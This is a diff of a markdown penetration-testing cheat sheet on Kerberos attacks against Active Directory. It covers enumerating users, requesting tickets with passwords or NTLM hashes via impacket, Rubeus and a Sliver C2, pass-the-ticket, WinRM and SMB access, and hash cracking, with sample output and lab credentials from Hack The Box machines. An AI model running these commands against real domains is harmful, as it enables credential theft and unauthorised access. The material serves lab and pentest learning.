@@ -1,87 +1,21 @@
 ---
 title: "Kerberos"
-tags: ["Kerberos", "Pass-The-Ticket", "Hash Cracking", "Rubeus", "Password Cracking", "Sliver", "Enumeration", "Ntlm", "Smb", "Kerbrute", "Pass-The-Hash", "Impacket", "Ticket Granting Ticket", "Domain Controller", "Active Directory", "Windows", "krb5", "Keytab", "SSSD"]
+tags: ["Active Directory", "Kerberos", "Domain Controller", "Enumeration", "Hash Cracking", "Impacket", "Kerbrute", "Keytab", "NTLM", "Pass-The-Hash", "Pass-The-Ticket", "Password Cracking", "Rubeus", "SSSD", "Sliver", "Smb", "TGT", "Ticket Granting Ticket", "Windows", "krb5"]
 ---
 
-### Users Enum
+{{< filter_buttons >}}
 
-{{< tab set1 tab1 >}}kerbrute{{< /tab >}}
-{{< tab set1 tab2 >}}metasploit{{< /tab >}}
+### Kerberos Ticket
+
+{{< tab set1 tab1 >}}Linux{{< /tab >}}
+{{< tab set1 tab2 >}}Windows{{< /tab >}}
+{{< tab set1 tab3 >}}C2{{< /tab >}}
 {{< tabcontent set1 tab1 >}}
 
-```console
-kerbrute userenum --domain <DOMAIN> --dc <DC> <USERS_FILE>
-```
-
-```console {class="sample-code"}
-$ kerbrute userenum --domain absolute.htb --dc dc.absolute.htb usernames.txt
-
-    __             __               __     
-   / /_____  _____/ /_  _______  __/ /____ 
-  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
- / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
-/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        
-
-Version: v1.0.3 (9dad6e1) - 09/24/24 - Ronnie Flathers @ropnop
-
-2024/09/24 14:54:41 >  Using KDC(s):
-2024/09/24 14:54:41 >   dc.absolute.htb:88
-
-2024/09/24 14:54:41 >  [+] VALID USERNAME:       j.roberts@absolute.htb
-2024/09/24 14:54:41 >  [+] VALID USERNAME:       m.chaffrey@absolute.htb
-2024/09/24 14:54:41 >  [+] VALID USERNAME:       s.osvald@absolute.htb
-2024/09/24 14:54:41 >  [+] VALID USERNAME:       d.klay@absolute.htb
-2024/09/24 14:54:41 >  [+] VALID USERNAME:       j.robinson@absolute.htb
-2024/09/24 14:54:41 >  [+] VALID USERNAME:       n.smith@absolute.htb
-2024/09/24 14:54:42 >  Done! Tested 88 usernames (6 valid) in 0.491 seconds
-```
-
-<small>*Ref: [kerbrute](https://github.com/ropnop/kerbrute)*</small>
-
-{{< /tabcontent >}}
-{{< tabcontent set1 tab2 >}}
+#### 1. Configure /etc/hosts
 
 ```console
-use auxiliary/gather/kerberos_enumusers
-```
-
-```console
-set user_file <USERS_FILE>
-```
-
-```console
-set rhosts <DC>
-```
-
-```console
-set domain <DOMAIN>
-```
-
-```console
-run
-```
-
-```console {class="sample-code"}
-msf6 auxiliary(gather/kerberos_enumusers) > run
-
-[*] Using domain: DANTE - 172.16.2.1:88        ...
-[*] 172.16.2.1 - User: "user1" user not found
-[*] 172.16.2.1 - User: "user2" user not found
-[*] 172.16.2.1 - User: "user3" user not found
-[+] 172.16.2.1 - User: "user4" does not require preauthentication. Hash: $krb5asrep$23$ ---[SNIP]--- 9161d63be1
----[SNIP]---
-[*] Auxiliary module execution completed
-```
-
-{{< /tabcontent >}}
-
----
-
-### Kerberos Ticket (From Linux)
-
-#### 1. Config /etc/hosts
-
-```console
+# Always in this order - DC.example.com example.com DC
 sudo nxc smb <DC_IP> --generate-hosts-file /etc/hosts
 ```
 
@@ -93,9 +27,10 @@ $ tail -n1 /etc/hosts
 10.129.235.149     DC.administrator.htb administrator.htb DC
 ```
 
-#### 2. Config /etc/krb5.conf
+#### 2. Configure /etc/krb5.conf
 
 ```console
+# Always in UPPERCASE - DC.EXAMPLE.COM
 sudo nxc smb <DC_IP> --generate-krb5-file /etc/krb5.conf
 ```
 
@@ -122,30 +57,74 @@ $ cat /etc/krb5.conf
     administrator.htb = ADMINISTRATOR.HTB
 ```
 
-#### 3. Config /etc/resolv.conf \[Optional\]
+{{< tab set1-1 tab1 active>}}impacket{{< /tab >}}{{< tab set1-1 tab2 >}}kinit{{< /tab >}}
+{{< tabcontent set1-1 tab1 >}}
 
-```console
-nameserver <DC_IP>
+#### 3. Request a Ticket
+
+```console {class="password"}
+# Password
+sudo ntpdate -s <DC_IP> && impacket-getTGT '<DOMAIN>/<USER>:<PASSWORD>' -dc-ip <DC_IP>
 ```
 
 ```console {class="sample-code"}
-nameserver 10.10.11.10
+$ sudo ntpdate -s 10.129.255.235 && impacket-getTGT 'ADMINISTRATOR.HTB/Olivia:ichliebedich' -dc-ip 10.129.255.235
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Saving ticket in Olivia.ccache
 ```
 
-{{< tab set3 tab1 >}}kinit{{< /tab >}}
-{{< tab set3 tab2 >}}impacket{{< /tab >}}
-{{< tabcontent set3 tab1 >}}
+```console {class="ntlm"}
+# NTLM
+sudo ntpdate -s <DC_IP> && impacket-getTGT '<DOMAIN>/<USER>' -hashes :<HASH> -dc-ip <DC_IP>
+```
 
-#### 4. Installation \[Optional\]
+```console {class="sample-code"}
+$ sudo ntpdate -s 10.129.255.235 && impacket-getTGT 'ADMINISTRATOR.HTB/Olivia' -hashes :fbaa3e2294376dc0f5aeb6b41ffa52b7 -dc-ip 10.129.255.235
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Saving ticket in Olivia.ccache
+```
+
+#### 4. Pass The Ticket
+
+```console
+export KRB5CCNAME='<USER>.ccache'
+```
+
+```console {class="sample-code"}
+$ export KRB5CCNAME='Olivia.ccache'
+```
+
+#### 5. Check
+
+```console
+klist
+```
+
+```console {class="sample-code"}
+$ klist
+Ticket cache: FILE:Olivia.ccache
+Default principal: Olivia@ADMINISTRATOR.HTB
+
+Valid starting       Expires              Service principal
+2025-07-16T20:54:29  2025-07-17T06:54:29  krbtgt/ADMINISTRATOR.HTB@ADMINISTRATOR.HTB
+        renew until 2025-07-17T20:54:29
+```
+
+{{< /tabcontent >}}
+{{< tabcontent set1-1 tab2 >}}
+
+#### 3. Installation \[Optional\]
 
 ```console
 sudo apt install krb5-user cifs-utils
 ```
 
-#### 5. Request a Ticket
+#### 4. Request a Ticket
 
-{{< tab set3-1 tab1 active >}}Password{{< /tab >}}{{< tab set3-1 tab2 >}}NTLM{{< /tab >}}
-{{< tabcontent set3-1 tab1 >}}
+{{< tab set1-2 tab1 active>}}Password{{< /tab >}}{{< tab set1-2 tab2 >}}NTLM{{< /tab >}}
+{{< tabcontent set1-2 tab1 >}}
 
 ```console
 sudo ntpdate -s <DC_IP> && kinit <USER>
@@ -156,8 +135,23 @@ $ sudo ntpdate -s 10.129.234.139 && kinit Olivia
 Password for Olivia@ADMINISTRATOR.HTB:
 ```
 
+```console
+# Check
+klist
+```
+
+```console {class="sample-code"}
+$ klist
+Ticket cache: FILE:/tmp/krb5cc_1000
+Default principal: Olivia@ADMINISTRATOR.HTB
+
+Valid starting       Expires              Service principal
+2025-07-15T05:02:44  2025-07-15T15:02:44  krbtgt/ADMINISTRATOR.HTB@ADMINISTRATOR.HTB
+        renew until 2025-07-16T05:02:37
+```
+
 {{< /tabcontent >}}
-{{< tabcontent set3-1 tab2 >}}
+{{< tabcontent set1-2 tab2 >}}
 
 ```console
 ktutil
@@ -217,11 +211,8 @@ Using keytab: Olivia.keytab
 Authenticated to Kerberos v5
 ```
 
-{{< /tabcontent >}}
-
-#### 6. Check
-
 ```console
+# Check
 klist
 ```
 
@@ -236,81 +227,14 @@ Valid starting       Expires              Service principal
 ```
 
 {{< /tabcontent >}}
-{{< tabcontent set3 tab2 >}}
+{{< /tabcontent >}}
+{{< /tabcontent >}}
+{{< tabcontent set1 tab2 >}}
 
 #### 1. Request a Ticket
 
-{{< tab set3-2 tab1 active >}}Password{{< /tab >}}{{< tab set3-2 tab2 >}}NTLM{{< /tab >}}
-{{< tabcontent set3-2 tab1 >}}
-
-```console
-sudo ntpdate -s <DC_IP> && impacket-getTGT '<DOMAIN>/<USER>:<PASSWORD>' -dc-ip <DC_IP>
-```
-
-```console {class="sample-code"}
-$ sudo ntpdate -s 10.129.255.235 && impacket-getTGT 'ADMINISTRATOR.HTB/Olivia:ichliebedich' -dc-ip 10.129.255.235
-Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
-
-[*] Saving ticket in Olivia.ccache
-```
-
-{{< /tabcontent >}}
-{{< tabcontent set3-2 tab2 >}}
-
-```console
-sudo ntpdate -s <DC_IP> && impacket-getTGT '<DOMAIN>/<USER>' -hashes :<HASH> -dc-ip <DC_IP>
-```
-
-```console {class="sample-code"}
-$ sudo ntpdate -s 10.129.255.235 && impacket-getTGT 'ADMINISTRATOR.HTB/Olivia' -hashes :fbaa3e2294376dc0f5aeb6b41ffa52b7 -dc-ip 10.129.255.235
-Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
-
-[*] Saving ticket in Olivia.ccache
-```
-
-{{< /tabcontent >}}
-
-#### 2. Check
-
-```console
-# Import ticket
-export KRB5CCNAME='<USER>.ccache'
-```
-
-```console {class="sample-code"}
-$ export KRB5CCNAME='Olivia.ccache'
-```
-
-```console
-# Check ticket
-klist
-```
-
-```console {class="sample-code"}
-$ klist
-Ticket cache: FILE:Olivia.ccache
-Default principal: Olivia@ADMINISTRATOR.HTB
-
-Valid starting       Expires              Service principal
-2025-07-16T20:54:29  2025-07-17T06:54:29  krbtgt/ADMINISTRATOR.HTB@ADMINISTRATOR.HTB
-        renew until 2025-07-17T20:54:29
-```
-
-{{< /tabcontent >}}
-
----
-
-### Kerberos Ticket (From Windows)
-
-{{< tab set4 tab1 >}}rubeus{{< /tab >}}
-{{< tabcontent set4 tab1 >}}
-
-#### 1. Request a Ticket
-
-{{< tab set4-1 tab1 active >}}Password{{< /tab >}}{{< tab set4-1 tab2 >}}NTLM{{< /tab >}}
-{{< tabcontent set4-1 tab1 >}}
-
-```console
+```console {class="password"}
+# Password
 .\rubeus.exe asktgt /user:<USER> /password:'<PASSWORD>' /enctype:<ENC_TYPE> /domain:<DOMAIN> /dc:<DC> /ptt /nowrap
 ```
 
@@ -351,10 +275,8 @@ Valid starting       Expires              Service principal
   ASREP (key)              :  7455663292585851686A2C8B2DF22DCA5B0A3E84404DD480466E982E49B10554
 ```
 
-{{< /tabcontent >}}
-{{< tabcontent set4-1 tab2 >}}
-
-```console
+```console {class="ntlm"}
+# NTLM
 .\rubeus.exe asktgt /user:<USER> /rc4:<HASH> /domain:<DOMAIN> /dc:<DC> /ptt /nowrap
 ```
 
@@ -395,8 +317,6 @@ Valid starting       Expires              Service principal
   ASREP (key)              :  1F4A6093623653F6488D5AA24C75F2EA
 ```
 
-{{< /tabcontent >}}
-
 #### 2. Check
 
 ```console
@@ -434,20 +354,12 @@ Cached Tickets: (2)
 ```
 
 {{< /tabcontent >}}
-
----
-
-### Kerberos Ticket (From C2)
-
-{{< tab set5 tab1 >}}Sliver{{< /tab >}}
-{{< tabcontent set5 tab1 >}}
+{{< tabcontent set1 tab3 >}}
 
 #### 1. Request a Ticket
 
-{{< tab set5-1 tab1 active >}}Password{{< /tab >}}{{< tab set5-1 tab2 >}}NTLM{{< /tab >}}
-{{< tabcontent set5-1 tab1 >}}
-
-```console
+```console {class="password"}
+# Password
 rubeus -- 'asktgt /user:<USER> /password:<PASSWORD> /enctype:<ENC_TYPE> /domain:<DOMAIN> /dc:<DC> /ptt /nowrap'
 ```
 
@@ -491,10 +403,8 @@ sliver (helloworld) > rubeus -- 'asktgt /user:m.lovegod /password:AbsoluteLDAP20
   ASREP (key)              :  7455663292585851686A2C8B2DF22DCA5B0A3E84404DD480466E982E49B10554
 ```
 
-{{< /tabcontent >}}
-{{< tabcontent set5-1 tab2 >}}
-
-```console
+```console {class="ntlm"}
+# NTLM
 rubeus -- 'asktgt /user:<USER> /rc4:<HASH> /domain:<DOMAIN> /dc:<DC> /ptt /nowrap'
 ```
 
@@ -537,8 +447,6 @@ sliver (helloworld) > rubeus -- 'asktgt /user:Administrator /rc4:1f4a6093623653f
   ASREP (key)              :  1F4A6093623653F6488D5AA24C75F2EA
 ```
 
-{{< /tabcontent >}}
-
 #### 2. Check
 
 ```console
@@ -572,13 +480,12 @@ Cached Tickets: (1)
 ### WinRM with Kerberos
 
 {{< tab set6 tab1 >}}evil-winrm{{< /tab >}}
-{{< tab set6 tab2 >}}wmiexec{{< /tab >}}
 {{< tabcontent set6 tab1 >}}
 
-#### 1. Config '/etc/krb5.conf'
+#### 1. Configure /etc/krb5.conf
 
 ```console
-# In UPPER case
+# In UPPERCASE
 
 [libdefaults]
     default_realm = <DOMAIN>
@@ -614,7 +521,8 @@ Cached Tickets: (1)
 #### 2. Connect
 
 ```console
-sudo ntpdate -s <DC_IP> && evil-winrm -i <TARGET_DOMAIN> -r <DOMAIN>
+# Ticket-based Kerberos
+sudo ntpdate -s <DC_IP> && evil-winrm -i <TARGET> -r <DOMAIN>
 ```
 
 ```console {class="sample-code"}
@@ -631,30 +539,12 @@ Info: Establishing connection to remote endpoint
 ```
 
 {{< /tabcontent >}}
-{{< tabcontent set6 tab2 >}}
-
-```console
-sudo ntpdate -s <DC_IP> && impacket-wmiexec '<DOMAIN>/<USER>@<TARGET_DOMAIN>' -k -no-pass
-```
-
-```console {class="sample-code"}
-$ sudo ntpdate -s DC.ABSOLUTE.HTB && impacket-wmiexec 'ABSOLUTE.HTB/Administrator@DC.ABSOLUTE.HTB' -k -no-pass
-Impacket v0.12.0.dev1+20240730.164349.ae8b81d7 - Copyright 2023 Fortra
-
-[*] SMBv3.0 dialect used
-[!] Launching semi-interactive shell - Careful what you execute
-[!] Press help for extra shell commands
-C:\>
-```
-
-{{< /tabcontent >}}
-
----
 
 ### SMB with Kerberos
 
 ```console
-sudo ntpdate -s <DC_IP> && impacket-smbclient '<DOMAIN>/<USER>@<TARGET_DOMAIN>' -k -no-pass
+# Ticket-based Kerberos
+sudo ntpdate -s <DC_IP> && impacket-smbclient '<DOMAIN>/<USER>@<TARGET>' -k -no-pass
 ```
 
 ```console {class="sample-code"}
@@ -751,3 +641,5 @@ cat result.txt | grep -E '^\$' | sort | uniq | tee hashes
 # Crack hashes
 hashcat -m 1800 -a 0 hashes /usr/share/wordlists/rockyou.txt --force
 ```
+
+<br>
